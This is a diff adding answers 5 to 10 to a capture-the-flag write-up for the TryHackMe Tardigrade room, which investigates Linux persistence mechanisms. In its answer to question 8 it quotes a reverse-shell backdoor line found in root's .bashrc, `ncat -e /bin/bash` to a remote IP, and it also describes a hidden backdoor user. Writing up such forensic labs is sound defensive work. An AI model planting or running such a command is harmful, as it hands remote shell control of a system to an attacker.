@@ -58,22 +58,64 @@ severe system compromise due to the full remote control and continuous reconnect
 
 QUESTION 5
 -----------------------------------------------------------------------------------------
+**This section is a bonus discussion on the importance of a dirty wordlist. Accept the
+extra point and happy hunting!**
 
+In this task, we have learned that dirty wordlists are used to collect everything that
+helps lead the investigation forward. From any *Indicator of Compromise* (IOC) to random
+notes. For the purpose of writeup we don't include all the dirty wordlist IOCs and
+commands because we want to avoid spoilers but normally we would include them.
 
 QUESTION 6
 -----------------------------------------------------------------------------------------
+**What does the error message in the terminal say after logging in to the root account?**
 
-
+We log in to the root account with `sudo su` after entering the *armani* password. Then,
+we patiently wait for a few seconds and observe a *Ncat* timeout error on the console.
+  
 QUESTION 7
 -----------------------------------------------------------------------------------------
+**What command was displayed in the terminal as part of the error message?**
 
+After the error message was printed, we press enter to get back to our prompt but observe
+an exit status to a command that is another reverse shell backdoor. In it the `ncat`
+tool tries to attach a bash shell to the remote network connection.
 
 QUESTION 8
 -----------------------------------------------------------------------------------------
+**Can you find out how the suspicious command has been implemented?**
 
+Since we know, that the `.profile` file is commonly the first file to be run upon login
+to a user, we investigate it in the root home directory. In it, we can not identify any
+particularly harmful behaviour, except its sourcing of the `.bashrc` file.
+```bash
+# ~/.profile: executed by Bourne-compatible login shells.
+
+if [ "$BASH" ]; then
+  if [ -f ~/.bashrc ]; then
+    . ~/.bashrc
+  fi
+fi
+
+mesg n 2> /dev/null || true
+```
+So, we further investigate the `.bashrc` file and with `tail` we can immediately spot
+the `ncat` command that caused the previous error message as it tried to connect to a
+possile C2 server or similar: `ncat -e /bin/bash 172.10.6.9 6969 &`
 
 QUESTION 9
 -----------------------------------------------------------------------------------------
+**What is the last persistence mechanism to fit the adversary's goals?**
 
+For this task, we investigate, among others the `/etc/passwd` file and discover an
+unusual entry to a standard low-privilege user with root group access. This user can not
+log in normally, since it's home directory is `/nonexistent`.
+
+QUESTION 10
+-----------------------------------------------------------------------------------------
+**The adversary left a golden nugget of "advise" somewhere.**
+
+From the previous task, we have seen the `/nonexistent` directory which contains a hidden
+file `.youfoundme` with the flag.
 
 [^1]: https://tryhackme.com/room/tardigrade
